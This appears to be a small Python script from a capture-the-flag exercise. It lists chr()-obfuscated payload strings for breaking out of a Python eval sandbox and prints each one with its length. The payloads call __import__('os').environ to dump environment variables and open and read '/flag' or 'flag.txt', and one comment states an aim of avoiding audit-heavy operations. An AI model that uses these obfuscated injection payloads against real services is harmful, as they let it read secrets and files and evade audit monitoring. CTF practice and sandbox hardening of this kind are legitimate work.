#!/usr/bin/env python3
# Different payload strategies

# Strategy 1: Read environment variables (might have flag)
# __import__(chr(111)+chr(115)).environ
payloads = [
    # Using os.environ (needs __import__)
    "getattr(__import__(chr(111)+chr(115)),chr(101)+chr(110)+chr(118)+chr(105)+chr(114)+chr(111)+chr(110))",
    
    # Simpler - directly use open but with different files
    "open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()",  # /flag
    "open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()",  # flag.txt
    
    # Try to use less audit-heavy operations
    "[*open(chr(102)+chr(108)+chr(97)+chr(103))]",  # read as list
]

for p in payloads:
    print(f"{len(p):2d} chars: {p}")
